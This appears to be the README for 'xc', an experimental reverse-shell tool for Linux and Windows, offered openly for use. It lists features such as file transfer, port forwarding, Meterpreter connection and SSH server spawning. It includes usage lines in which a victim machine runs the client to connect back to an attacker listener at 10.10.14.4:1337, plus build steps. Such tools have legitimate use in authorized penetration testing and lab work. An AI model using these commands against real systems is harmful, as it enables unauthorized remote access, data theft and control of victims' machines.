# xc

Netcat like reverse shell for Linux & Windows. This is still experimental so pull requests are welcome :)

## Features

* File Up-/Download
* Port Forwarding
* Change user context
* Connect to Meterpreter Listener: [windows/linux]/x64/meterpreter/reverse_tcp)
* Quick vulnerability check for recent CVEs on Windows
* Plugin System
* Spawn SSH Server on Linux

## Examples

- Linux Attacker:	`xc -l -p 1337`			    (Server)
- WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)


[![asciicast](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5.svg)](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5)

## Setup

Windows:
```
go get github.com/hashicorp/yamux
go build
```

Linux:
```
make
```

You probably want to replace the ssh keys in the keys folder if you plan to use the ssh server on linux. These will be used to spawn a ssh server with the !ssh command on linux.